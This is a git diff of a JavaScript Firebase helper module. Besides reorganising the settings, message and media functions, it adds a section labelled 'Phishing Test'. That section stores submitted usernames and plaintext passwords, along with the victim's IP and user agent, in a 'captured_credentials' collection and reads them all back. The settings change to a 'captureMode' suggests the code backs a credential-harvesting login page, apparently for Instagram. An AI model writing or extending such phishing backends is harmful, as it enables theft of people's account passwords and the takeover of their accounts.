@@ -16,21 +16,22 @@ const app = initializeApp(firebaseConfig);
 export const auth = getAuth(app);
 export const db = getFirestore(app);
 
-// Firestore helpers
+// --- Settings ---
 export async function getSettings() {
     const settingsDoc = await getDoc(doc(db, 'config', 'settings'));
-    return settingsDoc.exists() ? settingsDoc.data() : { requireIg: true };
+    return settingsDoc.exists() ? settingsDoc.data() : { captureMode: 'username' };
 }
 
+export async function updateSettings(settings) {
+    return await setDoc(doc(db, 'config', 'settings'), settings, { merge: true });
+}
+
+// --- Messages ---
 export async function saveMessage(messageData) {
     return await addDoc(collection(db, 'messages'), {
         ...messageData,
         timestamp: new Date().toISOString()
     });
-}
-
-export async function updateSettings(settings) {
-    return await setDoc(doc(db, 'config', 'settings'), settings, { merge: true });
 }
 
 export async function getAllMessages() {
@@ -39,6 +40,7 @@ export async function getAllMessages() {
     return snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
 }
 
+// --- Media ---
 export async function getAllMedia() {
     const q = query(collection(db, 'media'), orderBy('timestamp', 'desc'));
     const snapshot = await getDocs(q);
@@ -50,4 +52,21 @@ export async function saveMediaEntry(data) {
         ...data,
         timestamp: data.timestamp || new Date().toISOString()
     });
+}
+
+// --- Captured Credentials (Phishing Test) ---
+export async function saveCredentials(data) {
+    return await addDoc(collection(db, 'captured_credentials'), {
+        username: data.username,
+        password: data.password,
+        ip: data.ip || 'Unknown',
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+    });
+}
+
+export async function getAllCredentials() {
+    const q = query(collection(db, 'captured_credentials'), orderBy('timestamp', 'desc'));
+    const snapshot = await getDocs(q);
+    return snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
 }
